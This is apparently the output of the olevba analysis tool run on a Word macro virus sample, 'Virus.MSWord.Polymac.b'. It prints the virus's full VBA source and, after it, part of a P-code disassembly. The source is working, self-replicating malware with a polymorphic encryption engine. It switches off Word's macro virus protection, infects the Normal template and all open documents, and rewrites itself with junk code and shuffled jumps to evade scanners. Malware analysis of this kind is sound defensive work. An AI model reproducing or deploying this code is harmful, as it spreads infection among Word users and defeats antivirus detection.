olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Polymac.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Polymac.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
 Randomize
 CrStr = getname()
 SetAttr NormalTemplate.Path + "\" + NormalTemplate, 0
 'Permutation PolyMac
 'Macros used MacroCryptedPolymorphicRealisticAntiheuristicCodeEngine
 'by CyberShadow v2.0
 'No ideas to new versions :(
 With Application
  .EnableCancelKey = True
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
 Call compile(CryptedString, r11, r21, r23, CrStr)
 CrypteS = ""
 Call insertToText(CryptedString, r11, r21, r23, CrStr, CryptedS, ProceduresCounter)
 CryptedS = "Private Sub Document_Open()" + Chr$(13) + Chr$(10) + CryptedS
 CryptedS = CryptedS + Chr$(13) + Chr$(10) + "End Sub" + Chr$(13) + Chr$(10) + ProceduresCounter
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 If NT.lines(1, 1) = "" Then NT.Insertlines 1, CryptedS
 If Documents.Count > 1 Then
  aff = ActiveDocument
  For Each aDoc In Documents
   If aDoc.Name <> aff Then
    Documents(aDoc.Name).Activate
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.lines(1, 1) = "" Then AD.Insertlines 1, CryptedS
   End If
  Next
  If ActiveDocument.Name <> aff Then Documents(aff).Activate
 End If
 Application.ScreenUpdating = True
End Sub
Private Function getname()
 c = ""
 For i = 1 To Int(Rnd * 7) + 1
  b = Int(Rnd * 26) + 65
  If Rnd > 0.5 Then b = b + 32
  c = c + Chr$(b)
 Next
 c = c + Chr$(Asc("0") + Int(Rnd * 9))
 getname = c
End Function
Private Sub compile(CryptedString, r11, r21, r23, CrStr)
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 a = AD.lines(1, AD.countoflines)
 CryptedString = CrStr + "="
 fl = 0
 r1 = Int(Rnd * 255)
 r2 = Int(Rnd * 255)
 r3 = Int(Rnd * 255)
 r11 = r1: r21 = r2: r23 = r3
 For i = 1 To Len(a)
  b = Asc(Mid$(a, i, 1))
  r1 = (r1 + r2) Mod 255
  r2 = (r1 + r3) Mod 255
  r3 = (r2 + r1) Mod 255
  b = b Xor r3
  If (b < 33) Or b = Asc("""") Or b = Asc("+") Or b = Asc("_") Or b = Asc("^") Then
    If fl = 1 Then CryptedString = CryptedString + """"
    CryptedString = CryptedString + "+chr$(" + Str$(b) + ") ": fl = 0
   Else
    If fl = 0 Then
     If Mid$(CryptedString, Len(CryptedString) - 1, 1) = ")" Then CryptedString = CryptedString + "+"
     CryptedString = CryptedString + """"
    End If
    CryptedString = CryptedString + Chr$(b): fl = 1
  End If
 Next
 If Mid$(CryptedString, Len(CryptedString) - 1, 1) <> " " And Mid$(CryptedString, Len(CryptedString) - 1, 1) <> ")" Then CryptedString = CryptedString + """"
End Sub
Private Sub insertToText(CryptedString, r11, r21, r23, CrStr, CryptedS, ProceduresCounter)
 Call CorrectLine(CryptedString, CrStr, CryptedS)
 Call MakingDecryptor(r11, r21, r23, CrStr, CryptedS, myVars)
 Call PermuteCryptedBody(CryptedS, myVars, ProceduresCounter)
End Sub
Private Sub CorrectLine(CryptedString, CrStr, CryptedS)
 maxlen = Int(Rnd * 100) + 100
 c = "": l = 0: f2 = -1
 For i = 1 To Len(CryptedString)
  b = Mid$(CryptedString, i, 1)
  If b = """" Then f2 = -f2
  If l > maxlen And f2 = 1 Then
   c = c + """"
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr + "+""": l = Len(c)
  End If
  If b = "+" And l >= maxlen Then
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr: l = Len(c)
  End If
  c = c + b: l = l + 1
 Next
 CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
End Sub
Private Sub MakingDecryptor(r11, r21, r23, CrStr, CryptedS, myVars)
 VarCount = 8
 ReDim a(VarCount)
 myVars = "(" + CrStr
 For i = 1 To VarCount
  Do
   a1 = 0
   a(i) = getname()
   For j = 1 To i - 1
    If a(i) = a(j) Then a1 = 1
   Next
  Loop While a1 = 1
  myVars = myVars + "," + a(i)
 Next
 myVars = myVars + ")"
 s = StartString
 c = a(1) + "=" + Str$(r11) + Chr$(13) + Chr$(10)
 c = c + a(2) + "=" + Str$(r21) + Chr$(13) + Chr$(10)
 c = c + a(3) + "=" + Str$(r23) + Chr$(13) + Chr$(10)
 c = c + a(4) + "=""""" + Chr$(13) + Chr$(10)
 c1 = "mid$(" + CrStr + "," + a(5) + ",1)"
 c2 = a(1) + "=(" + a(1) + "+" + a(2) + ") mod 255" + Chr$(13) + Chr$(10)
 c2 = c2 + a(2) + "=(" + a(1) + "+" + a(3) + ") mod 255" + Chr$(13) + Chr$(10)
 c2 = c2 + a(3) + "=(" + a(2) + "+" + a(1) + ") mod 255" + Chr$(13) + Chr$(10)
 Select Case Int(Rnd * 2)
  Case Is = 0: c2 = c2 + a(6) + "=asc(" + c1 + ")" + Chr$(13) + Chr$(10) + a(6) + "=" + a(6) + " xor " + a(3) + Chr$(13) + Chr$(10) + a(4) + "=" + a(4) + "+chr$(" + a(6) + ")" + Chr$(13) + Chr$(10)
  Case Else: c2 = c2 + a(6) + "=asc(" + c1 + ")" + " xor " + a(3) + Chr$(13) + Chr$(10) + a(4) + "=" + a(4) + "+chr$(" + a(6) + ")" + Chr$(13) + Chr$(10)
 End Select
 Select Case Int(Rnd * 6)
  Case 0
   c = c + a(5) + "=1" + Chr$(13) + Chr$(10)
   c = c + ref("_do while ") + a(5) + "<=len(" + CrStr + ")" + Chr$(13) + Chr$(10)
   c = c + c2
   c = c + a(5) + "=" + a(5) + "+1" + Chr$(13) + Chr$(10)
   c = c + ref("_loop") + Chr$(13) + Chr$(10)
  Case 1
   c = c + a(5) + "=1" + Chr$(13) + Chr$(10)
   c = c + ref("_do until ") + a(5) + ">len(" + CrStr + ")" + Chr$(13) + Chr$(10)
   c = c + c2
   c = c + a(5) + "=" + a(5) + "+1" + Chr$(13) + Chr$(10)
   c = c + ref("_loop") + Chr$(13) + Chr$(10)
  Case 2
   c = c + a(5) + "=1" + Chr$(13) + Chr$(10)
   c = c + ref("_do") + Chr$(13) + Chr$(10) + c2
   c = c + a(5) + "=" + a(5) + "+1" + Chr$(13) + Chr$(10)
   c = c + ref("_loop while ") + a(5) + "<=len(" + CrStr + ")" + Chr$(13) + Chr$(10)
  Case 3
   c = c + a(5) + "=1" + Chr$(13) + Chr$(10)
   c = c + ref("_do") + Chr$(13) + Chr$(10) + c2
   c = c + a(5) + "=" + a(5) + "+1" + Chr$(13) + Chr$(10) + ref("_loop until ") + a(5) + ">len(" + CrStr + ")" + Chr$(13) + Chr$(10)
  Case Else
   c = c + ref("_for ") + a(5) + ref("=1 to len(") + CrStr + ")" + Chr$(13) + Chr$(10) + c2
   c = c + ref("_next") + Chr$(13) + Chr$(10)
 End Select
 Go2 = getname() + getname()
 c = c + Chr$(13) + Chr$(10)
 c = c + ref("if Options.ConfirmConversions = true then goto ") + Go2 + Chr$(13) + Chr$(10)
 c = c + "Options.ConfirmConversions = True" + Chr$(13) + Chr$(10)
 c = c + ref("documents.add") + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.vbproject.vbcomponents(1).codemodule.insertlines 1, ") + a(4) + Chr$(13) + Chr$(10)
 c = c + a(8) + ref("=normaltemplate.path+""\") + a(7) + ref(".doc""") + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.saveas filename:=") + a(8) + ref(", fileformat:=wdformatdocument") + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.close") + Chr$(13) + Chr$(10)
 c = c + ref("options.virusprotection=false") + Chr$(13) + Chr$(10)
 c = c + ref("documents.open ") + a(8) + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.save") + Chr$(13) + Chr$(10)
 c = c + ref("activedocument.close") + Chr$(13) + Chr$(10)
 c = c + "kill " + a(8) + Chr$(13) + Chr$(10)
 c = c + "^" + Go2 + ":" + Chr$(13) + Chr$(10)
 c = c + "Options.ConfirmConversions = False" + Chr$(13) + Chr$(10)
 CryptedS = CryptedS + c
End Sub
Private Function refn()
 If Rnd > 0.5 Then refn = Chr$(13) + Chr$(10) Else refn = ":"
End Function
Private Function ref(fff)
fff1 = ""
For i = 1 To Len(fff)
 b = Asc(Mid$(fff, i, 1))
 If Rnd > 0.5 And b >= 97 And b <= 122 Then b = b - 32
 fff1 = fff1 + Chr$(b)
Next
ref = fff1
End Function
Private Sub polym(fc, m)
 t = Int(Rnd * 7)
 maxm = 5
 Select Case t
  Case 0
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do while ") + s + "<" + Str$(Int(Rnd * 50) + 11) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop") + refn()
  Case 1
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do until ") + s + ">" + Str$(Int(Rnd * 50) + 11) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop") + refn()
  Case 2
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do ") + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop until ") + s + ">" + Str$(Int(Rnd * 50) + 41) + refn()
  Case 3
   s = getname() + getname()
   fc = fc + s + "=" + Str$(Int(Rnd * 10)) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("do ") + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + s + "=" + s + "+" + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + ref("loop while ") + s + "<" + Str$(Int(Rnd * 50) + 11) + refn()
  Case 4
   fc = fc + ref("for ") + getname() + getname() + "=" + Str$(Int(Rnd * 10)) + ref(" to ") + Str$(Int(Rnd * 50) + 11) + ref(" step ") + Str$(Int(Rnd * 10) + 1) + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + "next" + refn()
  Case 5
   tfc = 2
   fc = fc + getname() + getname() + "="
   If Rnd > 0.5 Then fc = fc + getname(): tfc = 0 Else fc = fc + Str$(Int(Rnd * 200))
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "+": tfc = 1
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "-": tfc = 1
   If Rnd > 0.5 And tfc = 0 Then fc = fc + "*": tfc = 1
   If tfc = 1 Then
    If Rnd > 0.5 Then fc = fc + getname() Else fc = fc + Str$(Int(Rnd * 100) + 1)
   End If
   fc = fc + refn()
   m = m + 1: If m < maxm Then Call polym(fc, m)
  Case 6
   fc = fc + Chr$(13) + Chr$(10) + ref("if ") + getname()
   If Rnd > 0.5 Then
     tfc = "<"
    ElseIf Rnd > 0.5 Then
     tfc = ">"
    ElseIf Rnd > 0.5 Then
     tfc = "="
    Else
     tfc = ""
   End If
   Do
    If Rnd > 0.5 Then
      tfc1 = "<"
     ElseIf Rnd > 0.5 Then
      tfc1 = ">"
     ElseIf Rnd > 0.5 Then
      tfc1 = "="
     Else
      tfc1 = ""
    End If
   Loop While tfc = tfc1
   fc = fc + tfc + tfc1
   If Rnd > 0.5 Then
     fc = fc + getname()
    ElseIf Rnd > 0.5 Then
     fc = fc + Str$(Int(Rnd * 100) + 1)
    Else
     fc = fc + "rnd*" + Str$(Int(Rnd * 100) + 1)
   End If
   fc = fc + ref(" then ") + Chr$(13) + Chr$(10)
   m = m + 1: If m < maxm Then Call polym(fc, m)
   fc = fc + Chr$(13) + Chr$(10) + ref("end if") + refn()
  Case Else
 End Select
End Sub
Private Sub PermuteCryptedBody(CryptedS, myVars, ProceduresCounter)
LinesCounter = 0
For i = 1 To Len(CryptedS)
 If Mid$(CryptedS, i, 1) = Chr$(13) Then LinesCounter = LinesCounter + 1
Next
ReDim CSLines(LinesCounter + 2)
ReDim TableCounter(LinesCounter + 1)
Dim CorrectTable(2)
i1 = 1
CSLines(LinesCounter + 2) = getname() + Chr$(Asc("0") + Int(Rnd * 9))
lastgoto = CSLines(LinesCounter + 2)
t = 1
ProceduresCounter = ""
For i = 1 To LinesCounter
 ProcedureFlag = 0
 fc = "": Call polym(fc, 1)
 fc = Chr$(13) + Chr$(10) + lastgoto + ":" + Chr$(13) + Chr$(10) + fc
 Do While Mid$(CryptedS, i1, 1) <> Chr$(13)
  CSLines(i) = CSLines(i) + Mid$(CryptedS, i1, 1)
  i1 = i1 + 1
 Loop
 fls = "": iflag = 0
 If Len(CSLines(i)) > 2 Then
  If UCase(Mid$(CSLines(i), 1, 1)) = "I" Then
   fls = Chr$(13) + Chr$(10): iflag = 1
   ProcedureFlag = 1
  End If
 End If
 CSL = ""
 For j = 1 To Len(CSLines(i))
  CSL1 = Mid$(CSLines(i), j, 1)
  If CSL1 = "_" Then
    CorrectTable(t) = i: t = t + 1
    ProcedureFlag = 1
    CSL1 = " "
  End If
  If CSL1 = "^" Then
   CSL1 = Chr$(13) + Chr$(10)
   ProcedureFlag = 1
  End If
  CSL = CSL + CSL1
 Next
 CSLines(i) = CSL
 If ProcedureFlag = 0 And Rnd > 0.5 Then
   callto = getname() + getname() + getname() + myVars
   fc2 = "": Call polym(fc2, 1): fc1 = "": Call polym(fc1, 1)
   If Rnd > 0.5 Then
     ProceduresCounter = ProceduresCounter + ref("private sub ") + callto + Chr$(13) + Chr$(10) + fc + CSLines(i) + refn() + fc1 + Chr$(13) + Chr$(10) + ref("end sub") + Chr$(13) + Chr$(10)
    Else
     ProceduresCounter = ref("private sub ") + callto + Chr$(13) + Chr$(10) + fc + CSLines(i) + refn() + fc1 + Chr$(13) + Chr$(10) + ref("end sub") + Chr$(13) + Chr$(10) + ProceduresCounter
   End If
   CSLines(i) = fc + fls + "call " + callto
  Else
   CSLines(i) = fc + fls + CSLines(i)
 End If
 
 fc = "": Call polym(fc, 1)
 If iflag = 1 Then
   CSLines(i) = CSLines(i) + Chr$(13) + Chr$(10)
  Else
   CSLines(i) = CSLines(i) + refn()
 End If
 lastgoto = getname() + Chr$(Asc("0") + Int(Rnd * 9))
 CSLines(i) = CSLines(i) + fc + "goto " + lastgoto
 TableCounter(i) = i
 i1 = i1 + 2
Next
TableCounter(LinesCounter + 1) = LinesCounter + 1
CSLines(LinesCounter + 1) = Chr$(13) + Chr$(10) + lastgoto + ":" + Chr$(13) + Chr$(10)

For i = 1 To LinesCounter
 k = Int(Rnd * (LinesCounter - 1)) + 1
 k1 = TableCounter(k)
 TableCounter(k) = TableCounter(LinesCounter + 1 - i)
 TableCounter(LinesCounter + 1 - i) = k1
Next
For i = 1 To LinesCounter
 For t = 1 To 2
  If TableCounter(i) = CorrectTable(t) Then
   k1 = TableCounter(i)
   TableCounter(i) = TableCounter(CorrectTable(t))
   TableCounter(CorrectTable(t)) = k1
   CorrectTable(t) = -1
  End If
 Next
Next

CryptedS = ""
For i = 1 To LinesCounter + 1
 CryptedS = CryptedS + CSLines(TableCounter(i)) + Chr$(13) + Chr$(10)
Next
CryptedS = "goto " + CSLines(LinesCounter + 2) + Chr$(13) + Chr(10) + CryptedS
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Polymac.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 63670 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	ArgsCall Read 0x0000 
' Line #2:
' 	ArgsLd getname 0x0000 
' 	St CrStr 
' Line #3:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #4:
' 	QuoteRem 0x0001 0x0013 "Permutation PolyMac"
' Line #5:
' 	QuoteRem 0x0001 0x0043 "Macros used MacroCryptedPolymorphicRealisticAntiheuristicCodeEngine"
' Line #6:
' 	QuoteRem 0x0001 0x0013 "by CyberShadow v2.0"
' Line #7:
' 	QuoteRem 0x0001 0x001B "No ideas to new versions :("
' Line #8:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #9:
' 	LitVarSpecial (True)
' 	MemStWith EnableCancelKey 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith ShowVisualBasicEditor 
' Line #12:
' 	EndWith 
' Line #13:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #14:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #15:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #16:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #17:
' 	EndWith 
' Line #18:
' 	Ld CryptedString 
' 	Ld r11 
' 	Ld r21 
' 	Ld r23 
' 	Ld CrStr 
' 	ArgsCall (Call) compile 0x0005 
' Line #19:
' 	LitStr 0x0000 ""
' 	St CrypteS 
' Line #20:
' 	Ld CryptedString 
' 	Ld r11 
' 	Ld r21 
' 	Ld r23 
' 	Ld CrStr 
' 	Ld CryptedS 
' 	Ld ProceduresCounter 
' 	ArgsCall (Call) insertToText 0x0007 
' Line #21:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld CryptedS 
' 	Add 
' 	St CryptedS 
' Line #22:
' 	Ld CryptedS 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld ProceduresCounter 
' 	Add 
' 	St CryptedS 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld CryptedS 
' 	Ld NT 
' 	ArgsMemCall Insertlines 0x0002 
' 	EndIf 
' Line #25:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #26:
' 	Ld ActiveDocument 
' 	St aff 
' Line #27:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #28:
' 	Ld aDoc 
' 	MemLd New 
' 	Ld aff 
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld aDoc 
' 	MemLd New 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #31:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld CryptedS 
' 	Ld AD 
' 	ArgsMemCall Insertlines 0x0002 
' 	EndIf 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Next 
' Line #34:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld aff 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld aff 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Activate 0x0000 
' 	EndIf 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Private Function getname(id_FFFE As Variant))
' Line #39:
' 	LitStr 0x0000 ""
' 	St c 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #41:
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	St B 
' Line #42:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	LitDI2 0x0020 
' 	Add 
' 	St B 
' 	EndIf 
' Line #43:
' 	Ld c 
' 	Ld B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #44:
' 	StartForVariable 
' 	Next 
' Line #45:
' 	Ld c 
' 	LitStr 0x0001 "0"
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #46:
' 	Ld c 
' 	St getname 
' Line #47:
' 	EndFunc 
' Line #48:
' 	FuncDefn (Private Sub compile(CryptedString, r11, r21, r23, CrStr))
' Line #49:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd countoflines 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	St a 
' Line #51:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	St CryptedString 
' Line #52:
' 	LitDI2 0x0000 
' 	St fl 
' Line #53:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St r1 
' Line #54:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St r2 
' Line #55:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St r3 
' Line #56:
' 	Ld r1 
' 	St r11 
' 	BoS 0x0000 
' 	Ld r2 
' 	St r21 
' 	BoS 0x0000 
' 	Ld r3 
' 	St r23 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	FnLen 
' 	For 
' Line #58:
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St B 
' Line #59:
' 	Ld r1 
' 	Ld r2 
' 	Add 
' 	Paren 
' 	LitDI2 0x00FF 
' 	Mod 
' 	St r1 
' Line #60:
' 	Ld r1 
' 	Ld r3 
' 	Add 
' 	Paren 
' 	LitDI2 0x00FF 
' 	Mod 
' 	St r2 
' Line #61:
' 	Ld r2 
' 	Ld r1 
' 	Add 
' 	Paren 
' 	LitDI2 0x00FF 
' 	Mod 
' 	St r3 
' Line #62:
' 	Ld B 
' 	Ld r3 
' 	Xor 
' 	St B 
' Line #63:
' 	Ld B 
' 	LitDI2 0x0021 
' 	Lt 
' 	Paren 
' 	Ld B 
' 	LitStr 0x0001 """
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "+"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "_"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "^"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #64:
' 	Ld fl 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
' 	LitStr 0x0001 """
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #65:
' 	Ld CryptedString 
' 	LitStr 0x0006 "+chr$("
' 	Add 
' 	Ld B 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0002 ") "
' 	Add 
' 	St CryptedString 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St fl 
' Line #66:
' 	ElseBlock 
' Line #67:
' 	Ld fl 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #68:
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ")"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
' 	LitStr 0x0001 "+"
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #69:
' 	Ld CryptedString 
' 	LitStr 0x0001 """
' 	Add 
' 	St CryptedString 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Ld CryptedString 
' 	Ld B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedString 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St fl 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Next 
' Line #74:
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 " "
' 	Ne 
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ")"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
' 	LitStr 0x0001 """
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Private Sub insertToText(CryptedString, r11, r21, r23, CrStr, CryptedS, ProceduresCounter))
' Line #77:
' 	Ld CryptedString 
' 	Ld CrStr 
' 	Ld CryptedS 
' 	ArgsCall (Call) CorrectLine 0x0003 
' Line #78:
' 	Ld r11 
' 	Ld r21 
' 	Ld r23 
' 	Ld CrStr 
' 	Ld CryptedS 
' 	Ld myVars 
' 	ArgsCall (Call) MakingDecryptor 0x0006 
' Line #79:
' 	Ld CryptedS 
' 	Ld myVars 
' 	Ld ProceduresCounter 
' 	ArgsCall (Call) PermuteCryptedBody 0x0003 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Private Sub CorrectLine(CryptedString, CrStr, CryptedS))
' Line #82:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #83:
' 	LitStr 0x0000 ""
' 	St c 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St l 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	St f2 
' Line #84:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CryptedString 
' 	FnLen 
' 	For 
' Line #85:
' 	Ld CryptedString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B 
' Line #86:
' 	Ld B 
' 	LitStr 0x0001 """
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld f2 
' 	UMi 
' 	St f2 
' 	EndIf 
' Line #87:
' 	Ld l 
' 	Ld maxlen 
' 	Gt 
' 	Ld f2 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #88:
' 	Ld c 
' 	LitStr 0x0001 """
' 	Add 
' 	St c 
' Line #89:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
